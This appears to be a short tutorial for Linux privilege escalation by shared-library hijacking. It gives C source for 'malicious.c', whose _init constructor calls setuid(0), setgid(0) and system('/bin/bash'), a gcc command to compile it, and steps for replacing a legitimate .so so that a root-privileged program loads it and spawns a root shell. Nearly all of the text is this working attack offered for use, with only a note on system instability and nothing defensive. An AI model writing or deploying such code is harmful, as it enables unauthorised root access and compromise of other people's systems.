// malicious.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void _init(void) { // Constructor function for shared library
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
# Compile with:
gcc -shared -o libmalicious.so malicious.c

The _init Function

This special function ensures that your malicious code executes as soon as the library is loaded by the target process.

Privilege Escalation

setuid(0) and setgid(0) explicitly set the effective user and group IDs to root, ensuring subsequent commands run with root privileges.

Execution Flow

Once compiled, replace the legitimate .so file. The next time the root-privileged program loads the library, your malicious _init function will execute, spawning a root shell.

Significant Risks

Replacing system libraries can cause severe system instability, leading to crashes, data corruption, or rendering the system unbootable.
